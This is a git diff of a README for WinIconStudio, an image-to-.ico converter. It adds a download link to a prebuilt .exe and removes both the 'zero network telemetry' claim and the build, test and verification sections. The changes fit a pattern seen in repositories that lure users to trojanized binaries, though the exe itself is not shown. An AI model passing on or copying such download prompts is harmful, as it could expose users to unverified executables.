@@ -1,5 +1,7 @@
 # WinIconStudio (Windows Icon Studio)
 
+[download](https://github.com/Hsytls5149/ICON-maker/blob/main/dist/portable/WinIconStudio.exe)
+
 **WinIconStudio** is a high-performance, offline Windows desktop utility and CLI that converts arbitrary image files (`.png`, `.jpg`, `.jpeg`, `.webp`, `.bmp`) into sharp, professional-grade, multi-resolution `.ico` containers with on-device AI background removal and dynamic edge sharpening.
 
 
@@ -8,7 +10,7 @@
 
 ## Key Features
 
-- **100% Offline & Private**: Runs entirely on your local Windows PC. Zero cloud credentials, zero API keys, zero network telemetry.
+- **100% Offline & Private**: Runs entirely on your local Windows PC.
 - **Embedded AI Background Removal**: On-device subject segmentation powered by `u2netp.onnx` (~4.3 MB) running directly on pure CPU via ONNX Runtime (< 0.6s latency).
 - **Intelligent Square Normalization**:
   - `PAD`: Transparent letterboxing / pillarboxing to prevent image distortion.
@@ -113,43 +115,3 @@ ICON/
 
 ---
 
-## Running the Automated Test Suite
-
-```powershell
-.\.venv\Scripts\pytest.exe -v
-```
-
-All unit, integration, error-handling, and offscreen GUI tests run in ~1.5s.
-
----
-
-## Building Standalone Executable & Installer
-
-### 1. Compile Single-File Portable Executable (OneFile)
-```powershell
-.\.venv\Scripts\python.exe build.py --onefile
-```
-Generates a single self-contained executable at `dist\portable\WinIconStudio.exe`.
-
-### 2. Compile Standalone Folder Bundle (OneDir)
-```powershell
-.\.venv\Scripts\python.exe build.py
-```
-Output is generated in `dist\release\WinIconStudio\`.
-
-### 3. Generate Windows Setup Installer (Inno Setup)
-Open `installer\WinIconStudio.iss` in Inno Setup Compiler or run via command line:
-```powershell
-ISCC.exe installer\WinIconStudio.iss
-```
-Generates `dist\installer\WinIconStudio-Setup-v1.0.0.exe`.
-
----
-
-## Quality & Acceptance Criteria Verification
-
-- [x] **Format Validation**: Output `.ico` conforms to Microsoft Windows Shell ICO specifications.
-- [x] **Size Completeness**: Contains 7 embedded resolutions (16, 24, 32, 48, 64, 128, 256 px).
-- [x] **Transparency Integrity**: Zero black edge halo artifacts on pure white and dark backgrounds.
-- [x] **Standalone Portability**: Pre-compiled executable runs with zero Python or runtime dependencies.
-- [x] **Performance Target**: Average processing latency is ~580–950 ms with AI background removal enabled (far faster than the 2.5s acceptance threshold).
